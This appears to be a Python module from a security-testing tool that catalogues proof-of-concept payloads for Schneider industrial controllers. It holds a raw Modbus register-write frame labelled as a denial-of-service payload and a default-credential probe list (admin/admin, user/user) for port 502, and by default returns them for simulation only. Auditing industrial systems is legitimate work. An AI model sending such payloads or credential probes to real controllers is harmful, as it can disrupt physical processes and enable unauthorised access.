"""Ricnar Exploit Solutions PoCs — MIT payload specs (REFERENCE_ONLY)."""

from __future__ import annotations

from typing import Any

# Schneider Modbus SEIG-style holding register write (EDB 45219 inspired)
SEIG_MODBUS_DOS_HEX = "00010000000601060300000001"

# Schneider Unity Pro default cred probe pattern
UNITY_CRED_PROBE = ("admin", "admin"), ("user", "user")

RICNAR_POCS: dict[str, dict[str, Any]] = {
    "seig_modbus_dos": {
        "protocol": "modbus",
        "port": 502,
        "payload_hex": SEIG_MODBUS_DOS_HEX,
        "impact": "DoS / register flood",
    },
    "unity_cred_check": {
        "protocol": "modbus",
        "port": 502,
        "creds": UNITY_CRED_PROBE,
        "impact": "default credential audit",
    },
}


def list_pocs() -> list[str]:
    return sorted(RICNAR_POCS.keys())


def get_poc(name: str, *, simulate: bool = True) -> dict[str, Any]:
    poc = RICNAR_POCS.get(name)
    if not poc:
        return {"success": False, "error": "unknown poc: {}".format(name)}
    return {"success": True, "simulate": simulate, "name": name, **poc}
